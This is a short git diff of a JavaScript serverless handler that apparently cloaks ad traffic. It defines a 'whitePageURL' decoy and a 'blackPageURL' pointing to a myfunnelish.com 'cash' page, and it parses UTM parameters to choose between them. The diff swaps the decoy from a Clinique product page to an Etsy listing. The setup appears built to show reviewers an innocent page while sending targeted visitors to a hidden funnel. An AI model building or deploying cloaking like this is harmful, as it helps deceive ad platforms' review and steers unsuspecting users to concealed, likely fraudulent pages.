@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.clinique.co.uk/product/1673/8279/skin-care/cleansers-makeup-removers/liquid-facial-soap";
+    const whitePageURL = "https://www.etsy.com/uk/listing/4330052930/fair-trade-linen-house-slippers-unisex?ls=a&ga_order=most_relevant&ga_search_type=all&ga_view_type=gallery&ga_search_query=cheap+shoes&ref=sc_gallery-1-4&pro=1&plkey=d331d77eb0674874bd78cfa5e6c6b2771b2630b3%3A4330052930";
     const blackPageURL = "https://gymboreeusk.myfunnelish.com/cash-1735686017557538-1759052013535697";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
